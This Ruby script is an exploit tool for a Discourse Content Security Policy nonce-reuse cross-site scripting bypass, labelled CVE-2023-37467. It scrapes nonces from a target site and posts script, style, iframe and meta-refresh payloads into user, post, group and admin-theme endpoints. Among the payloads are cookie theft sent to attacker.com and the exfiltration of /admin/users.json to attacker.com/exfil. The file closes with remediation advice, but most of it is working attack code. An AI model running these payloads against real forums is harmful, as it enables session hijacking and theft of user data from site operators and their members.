#!/usr/bin/env ruby
# CVE-2023-37467: Discourse CSP Nonce Reuse Bypass
# CVSS: 6.1 (Medium)
# Affected: Discourse < 3.1.1 stable, < 3.2.0.beta2
# Description: Content Security Policy nonce reuse allows XSS bypass
# Author: @ibrahimsql  https://x.com/ibrahmsql


require 'net/http'
require 'uri'
require 'nokogiri'
require 'openssl'
require 'base64'
require 'digest'

class CVE202337467
  def initialize(target_url)
    @target_url = target_url.chomp('/')
    @results = []
    @discovered_nonces = []
    @csp_policies = []
  end

  def run_exploit
    puts "\n[*] Testing CVE-2023-37467: Discourse CSP Nonce Reuse Bypass"
    puts "[*] Target: #{@target_url}"
    puts "[*] CVSS Score: 6.1 (Medium)"
    puts "[*] Affected: Discourse < 3.1.1 stable, < 3.2.0.beta2\n"

    # Test CSP implementation
    test_csp_presence
    test_nonce_discovery
    test_nonce_reuse
    test_xss_bypass_techniques
    test_script_injection_points
    test_style_injection_points
    test_meta_refresh_bypass
    test_iframe_bypass

    generate_report
    @results
  end

  private

  def test_csp_presence
    puts "[*] Testing Content Security Policy presence..."
    
    begin
      uri = URI(@target_url)
      response = make_request(uri, 'GET')
      
      if response
        csp_header = response['Content-Security-Policy'] || response['Content-Security-Policy-Report-Only']
        
        if csp_header
          @csp_policies << csp_header
          
          # Parse CSP directives
          directives = parse_csp_directives(csp_header)
          
          @results << {
            vulnerability: "CSP Policy Detection",
            severity: "Info",
            csp_header: csp_header,
            directives: directives,
            description: "Content Security Policy detected",
            impact: "CSP implementation found - testing for bypass opportunities"
          }
          
          puts "[+] CSP detected: #{csp_header[0..100]}..."
          
          # Check for nonce usage
          if csp_header.include?("'nonce-")
            puts "[+] CSP uses nonces - potential for reuse vulnerability"
            return true
          else
            puts "[-] CSP does not use nonces"
          end
        else
          puts "[-] No CSP header found"
          @results << {
            vulnerability: "Missing CSP",
            severity: "Low",
            description: "No Content Security Policy implemented",
            impact: "Increased XSS risk due to missing CSP protection"
          }
        end
      end
    rescue => e
      puts "[!] Error testing CSP presence: #{e.message}"
    end
    
    false
  end

  def test_nonce_discovery
    puts "[*] Discovering CSP nonces from page content..."
    
    begin
      # Test multiple pages to find nonces
      test_pages = [
        "/",
        "/login",
        "/signup",
        "/categories",
        "/latest",
        "/admin",
        "/users"
      ]
      
      test_pages.each do |page|
        uri = URI("#{@target_url}#{page}")
        response = make_request(uri, 'GET')
        
        if response && response.code == '200'
          nonces = extract_nonces_from_html(response.body)
          
          nonces.each do |nonce|
            unless @discovered_nonces.include?(nonce)
              @discovered_nonces << nonce
              puts "[+] Nonce discovered on #{page}: #{nonce[0..20]}..."
            end
          end
        end
      end
      
      if @discovered_nonces.length > 0
        @results << {
          vulnerability: "CSP Nonce Discovery",
          severity: "Medium",
          nonces_found: @discovered_nonces.length,
          sample_nonces: @discovered_nonces.first(3),
          description: "CSP nonces discovered in page content",
          impact: "Nonces can be extracted and potentially reused"
        }
        
        puts "[+] Total nonces discovered: #{@discovered_nonces.length}"
        return true
      else
        puts "[-] No nonces found in page content"
      end
    rescue => e
      puts "[!] Error discovering nonces: #{e.message}"
    end
    
    false
  end

  def test_nonce_reuse
    puts "[*] Testing nonce reuse vulnerability..."
    
    return if @discovered_nonces.empty?
    
    @discovered_nonces.each do |nonce|
      puts "[*] Testing nonce reuse: #{nonce[0..20]}..."
      
      # Test if nonce can be reused across requests
      if test_nonce_validity(nonce)
        @results << {
          vulnerability: "CSP Nonce Reuse",
          severity: "High",
          reusable_nonce: nonce,
          description: "CSP nonce can be reused across multiple requests",
          impact: "Allows XSS bypass using discovered nonce values"
        }
        
        puts "[+] Nonce reuse confirmed: #{nonce[0..20]}..."
        
        # Test XSS payload with reused nonce
        test_xss_with_nonce(nonce)
      end
    end
  end

  def test_nonce_validity(nonce)
    begin
      # Create a test script with the nonce
      test_payload = "<script nonce='#{nonce}'>console.log('CSP_BYPASS_TEST');</script>"
      
      # Try to inject via various parameters
      test_params = [
        { param: 'q', endpoint: '/search' },
        { param: 'username', endpoint: '/users' },
        { param: 'title', endpoint: '/new-topic' },
        { param: 'content', endpoint: '/posts' }
      ]
      
      test_params.each do |test|
        uri = URI("#{@target_url}#{test[:endpoint]}")
        
        # Test GET injection
        uri.query = "#{test[:param]}=#{URI.encode_www_form_component(test_payload)}"
        response = make_request(uri, 'GET')
        
        if response && response.body.include?("nonce='#{nonce}'")
          return true
        end
        
        # Test POST injection
        data = { test[:param] => test_payload }
        response = make_request(URI("#{@target_url}#{test[:endpoint]}"), 'POST', data)
        
        if response && response.body.include?("nonce='#{nonce}'")
          return true
        end
      end
    rescue => e
      puts "[!] Error testing nonce validity: #{e.message}"
    end
    
    false
  end

  def test_xss_with_nonce(nonce)
    puts "[*] Testing XSS bypass with nonce: #{nonce[0..20]}..."
    
    # XSS payloads that use the discovered nonce
    xss_payloads = [
      "<script nonce='#{nonce}'>alert('XSS_VIA_NONCE_REUSE');</script>",
      "<script nonce='#{nonce}'>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>",
      "<script nonce='#{nonce}'>fetch('/admin/users.json').then(r=>r.text()).then(d=>fetch('http://attacker.com/exfil',{method:'POST',body:d}));</script>",
      "<style nonce='#{nonce}'>body{background:url('http://attacker.com/css-exfil?data='+document.domain);}</style>"
    ]
    
    injection_points = [
      { param: 'title', endpoint: '/new-topic', method: 'GET' },
      { param: 'content', endpoint: '/posts', method: 'POST' },
      { param: 'bio', endpoint: '/users/update', method: 'POST' },
      { param: 'name', endpoint: '/groups/new', method: 'POST' },
      { param: 'description', endpoint: '/categories', method: 'POST' }
    ]
    
    xss_payloads.each_with_index do |payload, payload_idx|
      injection_points.each do |point|
        begin
          if point[:method] == 'GET'
            uri = URI("#{@target_url}#{point[:endpoint]}")
            uri.query = "#{point[:param]}=#{URI.encode_www_form_component(payload)}"
            response = make_request(uri, 'GET')
          else
            data = { point[:param] => payload }
            response = make_request(URI("#{@target_url}#{point[:endpoint]}"), 'POST', data)
          end
          
          if response && response.body.include?(payload)
            @results << {
              vulnerability: "XSS via Nonce Reuse",
              severity: "Critical",
              payload: payload,
              injection_point: "#{point[:method]} #{point[:endpoint]}?#{point[:param]}",
              nonce_used: nonce,
              description: "XSS payload successfully injected using reused CSP nonce",
              impact: "Complete CSP bypass allowing arbitrary script execution"
            }
            
            puts "[+] XSS confirmed at #{point[:endpoint]} with payload #{payload_idx + 1}"
          end
        rescue => e
          puts "[!] Error testing XSS with nonce: #{e.message}"
        end
      end
    end
  end

  def test_xss_bypass_techniques
    puts "[*] Testing additional CSP bypass techniques..."
    
    return if @discovered_nonces.empty?
    
    nonce = @discovered_nonces.first
    
    # Test various bypass techniques
    bypass_techniques = [
      {
        name: "Script Tag Injection",
        payload: "<script nonce='#{nonce}'>eval(atob('YWxlcnQoJ1hTUycpOw=='));</script>",
        description: "Base64 encoded payload execution"
      },
      {
        name: "Dynamic Script Creation",
        payload: "<script nonce='#{nonce}'>var s=document.createElement('script');s.src='data:text/javascript,alert(1)';document.head.appendChild(s);</script>",
        description: "Dynamic script element creation"
      },
      {
        name: "Event Handler Bypass",
        payload: "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))' nonce='#{nonce}'>",
        description: "Event handler with character code obfuscation"
      },
      {
        name: "CSS Injection",
        payload: "<style nonce='#{nonce}'>@import 'data:text/css,body{background:url(javascript:alert(1))}';</style>",
        description: "CSS-based JavaScript execution"
      },
      {
        name: "SVG Script Injection",
        payload: "<svg><script nonce='#{nonce}'>alert('SVG_XSS');</script></svg>",
        description: "SVG embedded script execution"
      }
    ]
    
    bypass_techniques.each do |technique|
      test_bypass_technique(technique, nonce)
    end
  end

  def test_bypass_technique(technique, nonce)
    begin
      # Test the bypass technique on various endpoints
      test_endpoints = [
        '/search?q=',
        '/new-topic?title=',
        '/users?username='
      ]
      
      test_endpoints.each do |endpoint|
        uri = URI("#{@target_url}#{endpoint}#{URI.encode_www_form_component(technique[:payload])}")
        response = make_request(uri, 'GET')
        
        if response && (response.body.include?(technique[:payload]) || response.body.include?("nonce='#{nonce}"))
          @results << {
            vulnerability: "CSP Bypass - #{technique[:name]}",
            severity: "High",
            technique: technique[:name],
            payload: technique[:payload],
            endpoint: endpoint,
            description: technique[:description],
            impact: "CSP bypass using #{technique[:name].downcase}"
          }
          
          puts "[+] #{technique[:name]} bypass successful at #{endpoint}"
        end
      end
    rescue => e
      puts "[!] Error testing bypass technique #{technique[:name]}: #{e.message}"
    end
  end

  def test_script_injection_points
    puts "[*] Testing script injection points..."
    
    return if @discovered_nonces.empty?
    
    nonce = @discovered_nonces.first
    
    # Common injection points in Discourse
    injection_points = [
      { endpoint: '/posts', param: 'raw', method: 'POST' },
      { endpoint: '/topics', param: 'title', method: 'POST' },
      { endpoint: '/users', param: 'name', method: 'POST' },
      { endpoint: '/categories', param: 'name', method: 'POST' },
      { endpoint: '/groups', param: 'name', method: 'POST' },
      { endpoint: '/badges', param: 'name', method: 'POST' },
      { endpoint: '/admin/customize/themes', param: 'name', method: 'POST' }
    ]
    
    test_payload = "<script nonce='#{nonce}'>window.CSP_BYPASS_CONFIRMED=true;</script>"
    
    injection_points.each do |point|
      test_injection_point(point, test_payload, nonce)
    end
  end

  def test_injection_point(point, payload, nonce)
    begin
      if point[:method] == 'GET'
        uri = URI("#{@target_url}#{point[:endpoint]}")
        uri.query = "#{point[:param]}=#{URI.encode_www_form_component(payload)}"
        response = make_request(uri, 'GET')
      else
        data = { point[:param] => payload }
        response = make_request(URI("#{@target_url}#{point[:endpoint]}"), 'POST', data)
      end
      
      if response && response.body.include?("nonce='#{nonce}'")
        @results << {
          vulnerability: "Script Injection Point",
          severity: "High",
          endpoint: point[:endpoint],
          parameter: point[:param],
          method: point[:method],
          nonce_used: nonce,
          description: "Script injection possible at #{point[:endpoint]}",
          impact: "Arbitrary script execution via nonce reuse"
        }
        
        puts "[+] Script injection confirmed: #{point[:method]} #{point[:endpoint]}[#{point[:param]}]"
      end
    rescue => e
      puts "[!] Error testing injection point #{point[:endpoint]}: #{e.message}"
    end
  end

  def test_style_injection_points
    puts "[*] Testing style injection points..."
    
    return if @discovered_nonces.empty?
    
    nonce = @discovered_nonces.first
    
    # CSS injection payloads
    css_payloads = [
      "<style nonce='#{nonce}'>body{background:url('http://attacker.com/css-exfil');}</style>",
      "<style nonce='#{nonce}'>@import url('data:text/css,body{background:url(javascript:alert(1))}');</style>",
      "<link rel='stylesheet' href='data:text/css,body{background:url(javascript:alert(1))}' nonce='#{nonce}'>"
    ]
    
    css_payloads.each_with_index do |payload, idx|
      test_css_injection(payload, nonce, idx + 1)
    end
  end

  def test_css_injection(payload, nonce, payload_num)
    begin
      # Test CSS injection on various endpoints
      test_endpoints = [
        { endpoint: '/users/update', param: 'bio', method: 'POST' },
        { endpoint: '/groups/new', param: 'bio', method: 'POST' },
        { endpoint: '/admin/customize/themes', param: 'css', method: 'POST' }
      ]
      
      test_endpoints.each do |point|
        data = { point[:param] => payload }
        response = make_request(URI("#{@target_url}#{point[:endpoint]}"), point[:method], data)
        
        if response && response.body.include?("nonce='#{nonce}'")
          @results << {
            vulnerability: "CSS Injection via Nonce",
            severity: "Medium",
            payload_number: payload_num,
            endpoint: point[:endpoint],
            parameter: point[:param],
            nonce_used: nonce,
            description: "CSS injection using reused CSP nonce",
            impact: "Style-based attacks and potential JavaScript execution"
          }
          
          puts "[+] CSS injection confirmed: #{point[:endpoint]}[#{point[:param]}] (Payload #{payload_num})"
        end
      end
    rescue => e
      puts "[!] Error testing CSS injection: #{e.message}"
    end
  end

  def test_meta_refresh_bypass
    puts "[*] Testing meta refresh CSP bypass..."
    
    return if @discovered_nonces.empty?
    
    nonce = @discovered_nonces.first
    
    # Meta refresh bypass payloads
    meta_payloads = [
      "<meta http-equiv='refresh' content='0;url=javascript:alert(1)' nonce='#{nonce}'>",
      "<meta http-equiv='refresh' content='0;url=data:text/html,<script>alert(1)</script>' nonce='#{nonce}'>"
    ]
    
    meta_payloads.each do |payload|
      test_meta_injection(payload, nonce)
    end
  end

  def test_meta_injection(payload, nonce)
    begin
      test_points = [
        { endpoint: '/new-topic', param: 'title' },
        { endpoint: '/posts', param: 'raw' }
      ]
      
      test_points.each do |point|
        data = { point[:param] => payload }
        response = make_request(URI("#{@target_url}#{point[:endpoint]}"), 'POST', data)
        
        if response && response.body.include?("nonce='#{nonce}'")
          @results << {
            vulnerability: "Meta Refresh CSP Bypass",
            severity: "Medium",
            endpoint: point[:endpoint],
            parameter: point[:param],
            nonce_used: nonce,
            description: "Meta refresh tag injection using CSP nonce",
            impact: "Potential redirection to malicious URLs"
          }
          
          puts "[+] Meta refresh bypass confirmed: #{point[:endpoint]}[#{point[:param]}]"
        end
      end
    rescue => e
      puts "[!] Error testing meta refresh bypass: #{e.message}"
    end
  end

  def test_iframe_bypass
    puts "[*] Testing iframe CSP bypass..."
    
    return if @discovered_nonces.empty?
    
    nonce = @discovered_nonces.first
    
    # Iframe bypass payloads
    iframe_payloads = [
      "<iframe src='javascript:alert(1)' nonce='#{nonce}'></iframe>",
      "<iframe src='data:text/html,<script>alert(1)</script>' nonce='#{nonce}'></iframe>",
      "<iframe srcdoc='<script>alert(1)</script>' nonce='#{nonce}'></iframe>"
    ]
    
    iframe_payloads.each do |payload|
      test_iframe_injection(payload, nonce)
    end
  end

  def test_iframe_injection(payload, nonce)
    begin
      test_points = [
        { endpoint: '/posts', param: 'raw' },
        { endpoint: '/users/update', param: 'bio' }
      ]
      
      test_points.each do |point|
        data = { point[:param] => payload }
        response = make_request(URI("#{@target_url}#{point[:endpoint]}"), 'POST', data)
        
        if response && response.body.include?("nonce='#{nonce}'")
          @results << {
            vulnerability: "Iframe CSP Bypass",
            severity: "High",
            endpoint: point[:endpoint],
            parameter: point[:param],
            nonce_used: nonce,
            description: "Iframe injection using CSP nonce",
            impact: "Embedded malicious content execution"
          }
          
          puts "[+] Iframe bypass confirmed: #{point[:endpoint]}[#{point[:param]}]"
        end
      end
    rescue => e
      puts "[!] Error testing iframe bypass: #{e.message}"
    end
  end

  def extract_nonces_from_html(html)
    nonces = []
    
    begin
      doc = Nokogiri::HTML(html)
      
      # Find script tags with nonce attributes
      doc.css('script[nonce]').each do |script|
        nonce = script['nonce']
        nonces << nonce if nonce && !nonce.empty?
      end
      
      # Find style tags with nonce attributes
      doc.css('style[nonce]').each do |style|
        nonce = style['nonce']
        nonces << nonce if nonce && !nonce.empty?
      end
      
      # Find link tags with nonce attributes
      doc.css('link[nonce]').each do |link|
        nonce = link['nonce']
        nonces << nonce if nonce && !nonce.empty?
      end
      
      # Extract nonces from CSP headers in meta tags
      doc.css('meta[http-equiv="Content-Security-Policy"]').each do |meta|
        content = meta['content']
        if content && content.include?("'nonce-")
          nonce_matches = content.scan(/'nonce-([^']+)'/)
          nonce_matches.each { |match| nonces << match[0] }
        end
      end
    rescue => e
      puts "[!] Error parsing HTML for nonces: #{e.message}"
    end
    
    nonces.uniq
  end

  def parse_csp_directives(csp_header)
    directives = {}
    
    csp_header.split(';').each do |directive|
      parts = directive.strip.split(/\s+/)
      next if parts.empty?
      
      directive_name = parts[0]
      directive_values = parts[1..-1]
      
      directives[directive_name] = directive_values
    end
    
    directives
  end

  def make_request(uri, method = 'GET', data = nil, headers = {})
    begin
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == 'https')
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
      http.read_timeout = 10
      http.open_timeout = 10

      request = case method.upcase
                when 'GET'
                  Net::HTTP::Get.new(uri.request_uri)
                when 'POST'
                  req = Net::HTTP::Post.new(uri.request_uri)
                  if data
                    if data.is_a?(Hash)
                      req.set_form_data(data)
                    else
                      req.body = data
                      req['Content-Type'] = 'application/json'
                    end
                  end
                  req
                end

      # Set headers
      request['User-Agent'] = 'Mozilla/5.0 (compatible; DiscourseMap/2.0)'
      request['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      headers.each { |key, value| request[key] = value }

      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      return nil
    end
  end

  def generate_report
    puts "\n" + "="*60
    puts "CVE-2023-37467 Exploitation Report"
    puts "="*60
    puts "Target: #{@target_url}"
    puts "Vulnerabilities Found: #{@results.length}"
    puts "Nonces Discovered: #{@discovered_nonces.length}"
    
    if @results.empty?
      puts "[+] No CSP nonce reuse vulnerabilities detected"
    else
      puts "\n[!] VULNERABILITIES DETECTED:"
      @results.each_with_index do |result, index|
        puts "\n#{index + 1}. #{result[:vulnerability]}"
        puts "   Severity: #{result[:severity]}"
        puts "   Description: #{result[:description]}"
        puts "   Impact: #{result[:impact]}"
        
        if result[:nonce_used]
          puts "   Nonce Used: #{result[:nonce_used][0..20]}..."
        end
        if result[:endpoint]
          puts "   Endpoint: #{result[:endpoint]}"
        end
        if result[:payload]
          puts "   Payload: #{result[:payload][0..50]}..."
        end
      end
      
      puts "\n[!] REMEDIATION:"
      puts "1. Update Discourse to version 3.1.1 stable or 3.2.0.beta2 or later"
      puts "2. Implement proper nonce generation with sufficient entropy"
      puts "3. Ensure nonces are unique per request and not reusable"
      puts "4. Review CSP implementation for proper nonce handling"
      puts "5. Consider using strict-dynamic CSP directive"
      puts "6. Implement proper input validation and output encoding"
    end
    
    puts "\n" + "="*60
  end
end

# Run the exploit if called directly
if __FILE__ == $0
  if ARGV.length != 1
    puts "Usage: ruby #{$0} <target_url>"
    puts "Example: ruby #{$0} https://discourse.example.com"
    exit 1
  end

  target_url = ARGV[0]
  exploit = CVE202337467.new(target_url)
  exploit.run_exploit
end
